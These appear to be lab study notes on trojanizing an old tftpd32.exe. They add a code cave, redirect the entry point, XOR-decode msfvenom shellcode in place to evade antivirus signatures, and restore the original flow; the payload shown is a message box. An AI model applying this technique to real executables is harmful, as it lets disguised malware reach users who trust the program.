# Basic Signature bypass (e.g. tftp32d.exe) (the old version 272)
# XOR encode is not a good option since the AV can detect (some of) obfuscations
# adding time delay may be able to bypass Signature detection

## Preparation (if the code cave is limited)
### 1. Use LordPE to add a code cave, edit code cave (e.g. 1000 hex size) to be executable
### 2. Add none byte (1000 hex size) by hex editor
```
.rtext code cave
Memory map, item 29
 Address=0046C000
 Size=00001000 (4096.)
 Owner=tftpd32  00400000
 Section=.rtext
 Type=Imag 01001002
 Access=RWE CopyOnWr
 Initial access=RWE

start: 0046C000
end  : 0046D000
```
### 3. check usable small code cave (e.g. .text section)
```
.text code cave
start: 004317E3
end  : 004317FF
size : 1C
```

## 1. Save a backup (take notes) for the Entry Point before program start
```
0041309C > $ E8 E3020000    CALL tftpd32.00413384
004130A1   .^E9 7AFEFFFF    JMP tftpd32.00412F20
004130A6  /$ 55             PUSH EBP
004130A7  |. 8BEC           MOV EBP,ESP
004130A9  |. A1 44B64300    MOV EAX,DWORD PTR DS:[43B644]
```
## 2. Edit CALL tftpd32.004228F5 --> JMP 004317E3 , Jump to small code cave first

## 3. Save registers & flags
```
pushad
pushfd
push eax * 8 (if need)
```
- Remark the ESP address after pushfd for further actions
- push eax * 8 for avoiding stack changing by shellcode

## 4. Generate shellcode (should add EXITFUNC=none)
```
msfvenom -a x86 --platform windows -p windows/messagebox TEXT="POWERUP" -b '\x00\x0a\x0d' --encrypt xor --encrypt-key riverbed -f hex EXITFUNC=none
```

# 5. encode shellcode (xor, also for decoding)
```
push EBX                             # save ebx original value
MOV EAX,0046C010                     # save starting address of shellcode address to eax
MOV EBX,42                           # declare a magic number you like, e.g. 42
XOR BYTE PTR DS:[EAX],BL             # xor magic number and shellcode in stack
INC EAX                              # increas the address position
INC EBX                              # change the ebx value
CMP EAX,0046C116                     # check if eax reached the end of shellcode
JLE SHORT 004317EE                   # jmp back to xor if eax doesnt reach the button of shellcode
POP EBX                              # get ebx original value back
JMP 0046C000                         # jmp to shellcode (for execution)

```

## 6. Calculate of ESP original address after shellcode executed
- after pushfd esp=0012FFA0
- after run shellcode esp=0012FF54
`A0 - 54 = 4C`

## 7. Back to original address
```
ADD esp,04C
popfd
popad
CALL 00413384
JMP 004130A1
```
